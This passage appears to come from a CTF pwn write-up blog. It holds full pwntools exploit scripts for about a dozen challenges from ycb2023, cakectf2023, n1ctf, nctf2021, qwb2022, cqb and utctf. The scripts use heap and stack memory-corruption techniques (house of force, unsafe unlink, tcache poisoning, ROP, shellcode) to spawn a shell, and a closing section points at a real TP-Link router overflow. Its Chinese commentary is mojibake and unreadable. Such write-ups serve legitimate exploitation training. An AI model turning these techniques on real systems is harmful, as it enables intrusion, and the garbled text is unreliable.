int overflow bypass the check&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28794)
elf=ELF(&amp;quot;./pwn&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-2&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
stack_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
base_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)-0x1426
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))

win_addr=base_addr+0x1318
idx=((1&amp;lt;&amp;lt;63)+7)-(1&amp;lt;&amp;lt;64)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_eazy_force&#34;&gt;ycb2023_eazy_force:&lt;/h3&gt;
&lt;p&gt;Â†ÜÊ∫¢Âá∫ÂÜôÔºå‰ªªÊÑèÂ§ßÂ∞èÂàÜÈÖçÂèØÊ≥ÑÈú≤libcÔºåÊó†pieÔºåhouse of forceÊ®°ÊùøÈ¢ò&lt;br&gt;
Âä´ÊåÅscanf_got‰∏∫&lt;code&gt;one_gadget&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28807)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

scanf_got=0x602050
malloc_got=0x602040

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;away\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;want?\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;write?\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0,0x30000,b&amp;quot;nmsl&amp;quot;)
# 0x5bb010
io.recvuntil(b&amp;quot;on &amp;quot;)
leak_addr=int(io.recv(14),16)-0x5bb010
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0x45226

payload=cyclic(0x28)+p64(0xFFFFFFFFFFFFFFFF)
add(1,0x20,payload)

io.recvuntil(b&amp;quot;on &amp;quot;)
top_chunk=int(io.recvuntil(b&amp;quot; is&amp;quot;,drop=True),16)+0x20
print(&amp;quot;top_chunk: &amp;quot;,hex(top_chunk))


add(2,scanf_got-top_chunk-0x20,b&amp;quot;&amp;quot;)

# gdb.attach(io)
# pause()

add(3,0x10,p64(shell)*2)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_printf_but_not_fmtstr&#34;&gt;ycb2023_Printf_but_not_fmtstr:&lt;/h3&gt;
&lt;p&gt;2.36 uaf ÂàõÂª∫Â†ÜÂùó&lt;code&gt;0x500-0x900&lt;/code&gt;&lt;br&gt;
partial relro , pie disable , ÁªôÂêéÈó®ÂáΩÊï∞&lt;br&gt;
Êâìunsafe unlink&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28400)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

win_addr=0x4011d6
chunk_list=0x4040e0

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)    
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

# gdb.attach(io)
# pause()

fd=chunk_list-0x18
bk=chunk_list-0x10

add(0,0x508) #0
add(1,0x508) #1

delete(0)

payload=p64(0)+p64(0x501)
payload+=p64(fd)+p64(bk)
payload=payload.ljust(0x500,b&amp;quot;\x00&amp;quot;)
payload+=p64(0x500)

edit(0,payload)

delete(1)

payload=p64(0)*3+p64(elf.got[b&amp;quot;puts&amp;quot;])
edit(0,payload)

edit(0,p64(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_vtable4b&#34;&gt;cakectf2023_vtable4b:&lt;/h3&gt;
&lt;p&gt;Ê≥ÑÈú≤Âú∞ÂùÄÔºåËßÇÂØüÊåáÈíàÂ∞±Ë°å‰∫ÜÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;)

io=remote(&amp;quot;vtable4b.2023.cakectf.com&amp;quot;,9000)

io.recvuntil(b&amp;quot;win&amp;gt; = &amp;quot;)
win_addr=int(io.recv(14),16)
print(&amp;quot;win_addr = &amp;quot; + hex(win_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
pd_addr=int(io.recvuntil(b&amp;quot;&amp;lt;-- message&amp;quot;,drop=True)[-36:-22],16)
print(&amp;quot;pd_addr = &amp;quot; + hex(pd_addr))
io.recvuntil(b&amp;quot;ed0 | &amp;quot;)
tp_addr=int(io.recv(16),16)
print(&amp;quot;tp_addr = &amp;quot; + hex(tp_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;Message: &amp;quot;,p64(win_addr)+b&amp;quot;\x00&amp;quot;*0x10+p64(0x21)+p64(pd_addr)+p64(pd_addr)[:-1])

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_bofww&#34;&gt;cakectf2023_bofww:&lt;/h3&gt;
&lt;p&gt;cpp pwnÔºåÁªô‰∫ÜÂêéÈó®Ôºåpartial relroÔºåÂæàÊòéÊòæÂè™ËÉΩaawÊîπ&lt;code&gt;__stack_chk_fail@GLIBC_2.4&lt;/code&gt;‰∏∫ÂêéÈó®ÂáΩÊï∞&lt;br&gt;
Á®ãÂ∫èÊúÄÂêé‰ºöË∞ÉÁî®ÊûêÊûÑÂáΩÊï∞Ôºå‰∏ÄÂºÄÂßãÊÉ≥ËøáÂä´ÊåÅ&lt;code&gt;_free_hook&lt;/code&gt;Ôºå22.04ÊâìÊ∂àËøô‰∏™ÂøµÂ§¥&lt;br&gt;
ÂêéÈù¢ÂèëÁé∞Â¶ÇÊûúËÉΩÊéßÂà∂&lt;code&gt;rbp-0x128&lt;/code&gt;ÁöÑÂÄºÂ∞±ËÉΩÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜôÔºåÁÑ∂Âêé‰∏ÄÁõ¥Êâæ‰∏çÂà∞Â¶Ç‰ΩïÊéßÂà∂ÔºåÂç°ËÄÅÂçäÂ§©&lt;br&gt;
ÁªìÊûúÂèëÁé∞ÂâçÈù¢Á®ãÂ∫èÊµÅÊúâ&lt;code&gt;memcpy&lt;/code&gt;ÂèØ‰ª•Áõ¥Êé•ÂÆûÁé∞aawÔºåhh&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;‚ñ∫ 0x7f6965f4d170 &amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;::_M_replace(unsigned long,
unsigned long, char const*, unsigned long)+192&amp;gt;    call   memcpy@plt                &amp;lt;memcpy@plt&amp;gt;
       dest: 0x404050 (__stack_chk_fail@got.plt) ‚Äî‚ñ∏ 0x4010a0 ‚óÇ‚Äî endbr64 
       src: 0x7ffc682d34f0 ‚Äî‚ñ∏ 0x4012f6 (win()) ‚óÇ‚Äî endbr64 
       n: 0x3
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bofww&amp;quot;)
io=remote(&amp;quot;bofww.2023.cakectf.com&amp;quot;,9002)
elf=ELF(&amp;quot;./bofww&amp;quot;)

win_addr=0x4012f6
chk_fail=0x404050

# gdb.attach(io)
# pause()

payload=p64(win_addr)+p64(0)+p64(chk_fail)*0x30
io.sendlineafter(b&amp;quot;name? &amp;quot;,payload)

idx=((1&amp;lt;&amp;lt;31)+1)-(1&amp;lt;&amp;lt;32)

payload=str(idx)
io.sendlineafter(b&amp;quot;you? &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_memorial_cabbage&#34;&gt;cakectf2023_memorial_cabbage:&lt;/h3&gt;
&lt;p&gt;gdbË∞ÉËØïÂèëÁé∞&lt;code&gt;memo_w&lt;/code&gt;Âè™ÈúÄ&lt;code&gt;0xff0&lt;/code&gt;bytesÁöÑÊï∞ÊçÆÂ∞±ÂèØ‰ª•Ë¶ÜÁõñÂà∞&lt;code&gt;tempdir&lt;/code&gt;ÔºåËÄåÈôêÂà∂ËæìÂÖ•ÈïøÂ∫¶‰∏∫&lt;code&gt;0xfff&lt;/code&gt;ÔºåÂ≠òÂú®Ê∫¢Âá∫ÂèØ‰ª•Ë¶ÜÁõñ&lt;code&gt;tempdir&lt;/code&gt;‰∏∫&lt;code&gt;/flag.txt\x00&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./cabbage&amp;quot;)
io=remote(&amp;quot;memorialcabbage.2023.cakectf.com&amp;quot;,9001)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
payload=cyclic(0xff0)+b&amp;quot;/flag.txt\x00&amp;quot;
io.sendlineafter(b&amp;quot;Memo: &amp;quot;,payload)


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;n1ctf_n1canary&#34;&gt;n1ctf_n1canary:&lt;/h3&gt;
&lt;p&gt;Â∏∏ËßÑÂºÇÂ∏∏Â§ÑÁêÜÁªïËøácanary(Âî¨‰∫∫ÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./a&amp;quot;)

backdoor = 0x403387

gdb.attach(
    io, &#39;b *0x403405\nb *0x4037ee\nb *0x405128\nb *0x40512e\nb *0x404fd3\nb *0x404f6a&#39;)

payload = p64(0x4f4aa0)+p64(backdoor)
payload = payload.ljust(64, b&amp;quot;a&amp;quot;)
io.sendafter(b&amp;quot;canary\n&amp;quot;, payload)

io.sendlineafter(b&amp;quot;pwn :)\n&amp;quot;, cyclic(0x68)+p64(0x403407)+p64(0x4f4aa0)*8)
print(&amp;quot;offset:&amp;quot;, cyclic_find(0x6261616362616162))


io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nctf_2021_login&#34;&gt;nctf_2021_login&lt;/h3&gt;
&lt;p&gt;Ê†àËøÅÁßªÂêéÂà©Áî®csuÊîπ&lt;code&gt;close@got[plt]&lt;/code&gt;‰ΩéÂ≠óËäÇ‰∏∫&lt;code&gt;\x99&lt;/code&gt;ÊûÑÈÄ†syscall&lt;br&gt;
‰πãÂêéretÂà∞Á¨¨‰∫åÊ¨°readÊéßÂà∂rax‰∏∫&lt;code&gt;0x3b&lt;/code&gt;&lt;br&gt;
ÈöèÂêéÂà©Áî®csuÊéßÂà∂&lt;code&gt;rdx&lt;/code&gt;‰∏∫0ÔºåÊûÑÈÄ†&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28857)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

ret=0x40101a
pop_rdi=0x401293
pop_rsi_r15=0x401291 
leave_ret=0x40121f
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
read_text=0x04011ed  

csu_1=0x40128a
# 0040128a  5b                 pop     rbx {__saved_rbx}
# 0040128b  5d                 pop     rbp {__saved_rbp}
# 0040128c  415c               pop     r12 {__saved_r12}
# 0040128e  415d               pop     r13 {__saved_r13}
# 00401290  415e               pop     r14 {__saved_r14}
# 00401292  415f               pop     r15 {__saved_r15}
# 00401294  c3                 retn     {__return_addr}

csu_2=0x401270
# 00401270  4c89f2             mov     rdx, r14
# 00401273  4c89ee             mov     rsi, r13
# 00401276  4489e7             mov     edi, r12d
# 00401279  41ff14df           call    qword [r15+rbx*8]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;NCTF2021!\n&amp;quot;)

#offset 0x110
payload=cyclic(0x100)+p64(0x404400)+p64(read_text)
io.send(payload)


# pre-modify close_got and prepare for rop chain
payload=p64(csu_1)+p64(0)+p64(0x1)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(0x200)+p64(read_got)
payload+=p64(csu_2)+b&amp;quot;/bin/sh\x00&amp;quot;
payload=payload.ljust(0x78,b&amp;quot;a&amp;quot;)


payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x404800)*2+p64(elf.sym[b&amp;quot;read&amp;quot;])
payload+=p64(csu_1)+p64(0)*2+p64(0x404340)+p64(0)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(csu_2)


payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)+p64(0x404300-0x8)+p64(leave_ret)
io.send(payload)

# modify close_got
io.send(b&amp;quot;\x99&amp;quot;)

# trigger
sleep(3)
io.send(b&amp;quot;a&amp;quot;*0x3b)



io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040121f : leave ; ret
# 0x000000000040128c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401290 : pop r14 ; pop r15 ; ret
# 0x0000000000401292 : pop r15 ; ret
# 0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401293 : pop rdi ; ret
# 0x0000000000401291 : pop rsi ; pop r15 ; ret
# 0x000000000040128d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;qwb2022_devnull&#34;&gt;qwb2022_devnull&lt;/h3&gt;
&lt;p&gt;Ê†àËøÅÁßªÔºãmprotect+shellcode&lt;br&gt;
Ê≥®ÊÑèfgets&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./devnull&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./devnull&amp;quot;)
libc=elf.libc

mprotect=0x4012D0
w_addr=0x3fe000
pop_rbp=0x40129d
leave_ret=0x401354
mov_eax=0x401350

# gdb.attach(io)
# pause()

payload=cyclic(0x20)
io.sendafter(b&amp;quot;filename\n&amp;quot;,payload)

payload=cyclic(0xc+8)+p64(w_addr)+p64(w_addr+0x10)+p64(leave_ret)
io.sendafter(b&amp;quot;discard\n&amp;quot;,payload)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x3fea00
    pop rsi
    push 0x200
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x3fea00
call rax
&#39;&#39;&#39;)

payload=p64(0x3fe000)+p64(0x3fe018)*2+p64(mov_eax)+p64(mprotect)+p64(0xdeadbeef)+p64(0x3fe038)+read_shellcode+call_shellcode
io.sendafter(b&amp;quot;data\n&amp;quot;,payload)

# pause()

io.send(asm(shellcraft.sh()))

io.interactive()

# 0x0000000000401354: leave; ret;
# 0x000000000040101a: ret;
# 0x0000000000401351: mov eax, dword ptr [rbp - 0x18]; leave; ret;
# 0x000000000040129d: pop rbp; ret;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_nmanager&#34;&gt;cqb_nmanager:&lt;/h3&gt;
&lt;p&gt;Ê∫¢Âá∫ÁªïËøáÈöèÊú∫È™åËØÅÔºåÊ†à‰∏äË∂äÁïåËØªÂÜôROP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nmanager&amp;quot;)
# io=remote(&amp;quot;127.0.0.1&amp;quot;,1234)
io=remote(&amp;quot;8.147.135.190&amp;quot;,44768)
elf=ELF(&amp;quot;./nmanager&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

ret=0x40101a

def modify(n,gd,age,name):
    io.sendlineafter(b&amp;quot;modify ##\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;gender: &amp;quot;,gd)
    io.sendlineafter(b&amp;quot;age: &amp;quot;,str(age))
    io.sendafter(b&amp;quot;name: &amp;quot;,name)

def choice(n):
    if n == 0:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;n&amp;quot;)
    else:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;y&amp;quot;)
        

payload=b&amp;quot;./flag\x00\x00&amp;quot;+cyclic(0x58)+b&amp;quot;check passed&amp;quot;.ljust(0x20,b&amp;quot;\x00&amp;quot;)
io.sendlineafter(b&amp;quot;password: &amp;quot;,payload)


### leak libc
modify(8,b&amp;quot;nmsl&amp;quot;*2,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;nmsl&amp;quot;*2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

choice(0)


### leak canary
modify(-1,b&amp;quot;a&amp;quot;,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;gender: a&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))

choice(0)

### rop
payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
modify(-1,payload,str_sh,p64(sys_addr))

choice(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_book&#34;&gt;cqb_book&lt;/h3&gt;
&lt;p&gt;2.35ÔºåÁôΩÁªôuafÔºåÂáΩÊï∞ÈΩêÂÖ®ÔºåËøôÈáåÈÄâÊã©Â†ÜÊ†àÁªìÂêàÊâìropÔºåIOÊ≤°Â•ΩÁöÑÊ®°ÊùøÂÆûÂú®‰∏çÊÉ≥Áúã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;8.147.135.190&amp;quot;,13854)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size :&amp;quot;,str(s))


def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content: &amp;quot;,cc)


# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;
ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))


payload=p64(environ^key)+p64(0)
edit(4,payload)

add(4,0x90)
add(5,0x90)
add(6,0x90)
add(7,0x90)
show(7)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

ret_addr=stack_addr-0x188
# stack_addr 0x7fffffffdee8
# ret 0x7fffffffdda8

payload=p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)

for i in range(8,13):
    add(i,0x100)

for i in range(8,12):
    delete(i)

edit(11,p64(ret_addr^key))
add(8,0x100)

# gdb.attach(io)
# pause()

add(9,0x100)
edit(9,cyclic(0x28)+payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_webserver&#34;&gt;utctf_webserver&lt;/h3&gt;
&lt;p&gt;ÂàÜÊûêËøá‰∫ÜÔºåÁõ¥Êé•Ë¥¥Á†Å&lt;br&gt;
Ê∫¢Âá∫ÂØºËá¥ÁöÑÊ†à‰∏äÂèÇÊï∞ÂèØÊéßÂÜôgotÊåáÈíàÔºå‰ªªÊÑèÂú∞ÂùÄÂÜôÂ†ÜÂú∞ÂùÄÔºålowbyteÂÜô&lt;code&gt;\x00&lt;/code&gt;ÔºåÊîπ&lt;code&gt;strstr&lt;/code&gt;‰∏∫&lt;code&gt;strtol&lt;/code&gt;&lt;br&gt;
vuln:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int header_count = 0;
int header_cap = 0;
struct Header *headers = NULL;
char *name = take_until_char(header_line, &amp;amp;index, &#39;:&#39;);
char *value = take_until_newline(header_line, &amp;amp;index);
name = malloc_str(name);
value = malloc_str(value);

//skip this
if (header_count + 1 &amp;gt; header_cap) {
    int new_cap = header_cap &amp;lt; 4 ? 4 : header_cap * 2;
    headers = realloc(headers, sizeof(struct Header) * new_cap);
    header_cap = new_cap;
}

struct Header h;   # control h -&amp;gt; got_ptr
h.name = name;  # got1 -&amp;gt; heap_addr1
h.value = value; # got2 -&amp;gt; heap_addr2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./webserver&amp;quot;)
# io = remote(&amp;quot;guppy.utctf.live&amp;quot;, 5848)

io.send(b&amp;quot;GET /flag.txt HTTP/1.1\r\n&amp;quot;)
#
gdb.attach(io)
pause()

headers = b&amp;quot;1:1\x00&amp;quot;  # prepare for overflow &amp;amp;&amp;amp; make heap addr

payload = headers

# skip if condition
payload += b&amp;quot;\x01&amp;quot;*(0x350-0x30-len(headers))

# 0x402380 &amp;lt;main+665&amp;gt;    mov    rax, qword ptr [rbp - 0x30]
# ...
# 0x402399 &amp;lt;main+690&amp;gt;    mov    qword ptr [rcx + 8], rdx    &amp;lt;exit@got[plt]+1&amp;gt;
payload += p64(0x4050e0-0xf)  # rcx

payload += b&amp;quot;\r\n&amp;quot;
payload += b&amp;quot;\r\n&amp;quot;
io.send(payload)

io.send(b&amp;quot;a&amp;quot;*0x20000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_ecorp&#34;&gt;utctf_ecorp&lt;/h3&gt;
&lt;p&gt;ref:&lt;br&gt;
&lt;a href=&#34;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&#34;&gt;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&#34;&gt;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&lt;/a&gt;&lt;br&gt;
È¢òÁõÆÁªôÂá∫ÁöÑÂõ∫‰ª∂ÁâàÊú¨ÂØπÂ∫îÁ¨¨‰∏ÄÁØá‰∏≠Âõ∫‰ª∂ÁâàÊú¨Ôºåheaders‰∏≠ÁöÑcookieÂ≠òÂú®ÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÔºåÊïÖËØ•ÊºèÊ¥ûÂèØ‰ª•Áõ¥Êé•Êâì&lt;br&gt;
È¢òÁõÆË¶ÅÊ±ÇÈúÄË¶ÅÂèçÂºπshell&lt;br&gt;
È¢òÁõÆÁªôÂá∫Âõ∫ÂÆöÁöÑÊ†àÂú∞ÂùÄÔºåÂπ∂‰∏îadminÁªôÂá∫ÊèêÁ§∫&lt;/p&gt;
